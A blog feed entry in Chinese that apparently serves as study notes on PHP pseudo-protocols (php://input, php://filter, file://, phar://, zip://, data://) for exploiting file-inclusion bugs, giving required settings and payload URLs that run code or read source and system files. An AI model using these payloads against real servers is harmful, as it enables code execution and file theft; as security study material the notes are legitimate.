    <entry>
      <title>php伪协议总结</title>
      <link href="/2023/04/03/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/"/>
      <url>/2023/04/03/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="php伪协议总结"><a href="#php伪协议总结" class="headerlink" title="php伪协议总结"></a>php伪协议总结</h1><h2 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h2><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen=On</span><br><span class="line">allow_url_include=On</span><br></pre></td></tr></table></figure><h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">php://input 是个可以访问请求的原始数据的只读流，即获取post的数据</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$d = file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line">//echo $d;</span><br><span class="line">@eval($d)</span><br><span class="line">?&gt;</span><br><span class="line">即所使用post中的数据</span><br><span class="line"></span><br><span class="line">&lt;?php @include($_GET[“file”]); ?&gt;</span><br><span class="line">可直接传入post数据，来进行</span><br><span class="line">url=........./?file=php://input</span><br><span class="line">&lt;?php system(&quot;whoami&quot;)?&gt;</span><br><span class="line">因此可用来执行代码</span><br></pre></td></tr></table></figure><h2 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h2><h3 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">只是读取，需要开启 allow_url_fopen，不需要开启 allow_url_include</span><br></pre></td></tr></table></figure><h3 id="用法-1"><a href="#用法-1" class="headerlink" title="用法"></a>用法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=i.php</span><br><span class="line">或</span><br><span class="line">?file=php://filter/read=convert.base64-encode/resource=xx.php</span><br><span class="line">获取目标文件的base64加密后文件内容</span><br><span class="line">用来读取文件</span><br></pre></td></tr></table></figure><h2 id="file-x2F-x2F-伪协议"><a href="#file-x2F-x2F-伪协议" class="headerlink" title="file:&#x2F;&#x2F;伪协议"></a>file:&#x2F;&#x2F;伪协议</h2><h3 id="条件-2"><a href="#条件-2" class="headerlink" title="条件"></a>条件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen=on/offdf</span><br><span class="line">allow_url_include=on/off （均不受影响）</span><br></pre></td></tr></table></figure><h3 id="用法-2"><a href="#用法-2" class="headerlink" title="用法"></a>用法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=file://C:\Windows\System32\drivers\etc\hosts</span><br><span class="line">来读取本地的文件</span><br></pre></td></tr></table></figure><h2 id="phar-x2F-x2F-伪协议"><a href="#phar-x2F-x2F-伪协议" class="headerlink" title="phar:&#x2F;&#x2F;伪协议"></a>phar:&#x2F;&#x2F;伪协议</h2><h3 id="条件-3"><a href="#条件-3" class="headerlink" title="条件"></a>条件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen: off/on</span><br><span class="line">allow_url_include: off/on (均不受影响)</span><br></pre></td></tr></table></figure><h3 id="用法-3"><a href="#用法-3" class="headerlink" title="用法"></a>用法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=phar://压缩包名/内部文件名</span><br><span class="line">例：phar://x.zip/x.php</span><br></pre></td></tr></table></figure><h2 id="zip-x2F-x2F-伪协议"><a href="#zip-x2F-x2F-伪协议" class="headerlink" title="zip:&#x2F;&#x2F;伪协议"></a>zip:&#x2F;&#x2F;伪协议</h2><h3 id="条件-4"><a href="#条件-4" class="headerlink" title="条件"></a>条件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen: off/on</span><br><span class="line">allow_url_include: off/on (均不受影响</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名]   </span><br><span class="line">例： zip://D:\phpstudy\WWW\x.zip%23shell.php       #-&gt;%23</span><br></pre></td></tr></table></figure><h2 id="data-x2F-x2F"><a href="#data-x2F-x2F" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h2><h4 id="条件-5"><a href="#条件-5" class="headerlink" title="条件"></a>条件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen: on</span><br><span class="line">allow_url_include: on </span><br></pre></td></tr></table></figure><h4 id="用法-4"><a href="#用法-4" class="headerlink" title="用法"></a>用法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">和php://input很像，php://input以post提交数据那样提交数据，</span><br><span class="line">data://是以get方式提交数据，也是可以执行提交的脚本</span><br><span class="line"></span><br><span class="line">?file=data://text/plain,&lt;?php%20phpinfo()?&gt;</span><br><span class="line">对特殊字符进行了过滤，可以通过base64编码后再输入</span><br><span class="line">data://text/plain;base64,base64加密的代码</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/cosmoslin/article/details/120695429">(23条消息) PHP伪协议详解_Snakin_ya的博客-CSDN博客_php伪协议</a></p>]]></content>
      
      
